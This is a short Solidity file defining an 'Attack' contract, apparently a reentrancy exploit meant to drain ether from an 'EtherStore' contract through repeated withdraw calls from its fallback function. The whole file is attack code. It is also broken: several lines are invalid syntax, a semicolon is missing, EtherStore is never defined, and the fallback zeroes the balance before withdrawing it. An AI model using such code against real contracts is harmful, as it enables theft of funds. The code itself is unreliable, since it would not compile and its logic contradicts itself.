pragma solidity >=0.5.1;

contract Attack {
    //etherstore of user
    EtherStore public store;

    //balance of user
    uint256 public balance;

    //update the user's balance
    function updateBalance() public {
        balance = address(store).balance;
    }

    //fallback function triggers when msg.sender.call is executed
    function() external payable {
        if (balance > 0) {
            //reset balance to 0
            balance = 0;
            
            //withdraw the rest of the money if user balance is greater than 0
            store.withdraw(balance ether);
        }
    }

    //the main attack function
    function attack() external payable {
        //need the attacker's ether to be greater or equal to 1
        require(msg.value >= 1 ether);

        //update user's balance
        updateBalance();

        //deposit 1 ether
        store.deposit(value: 1 ether)();

        //withdraw one ether which triggers fallback function
        store.withdraw(1 ether)

    }
}
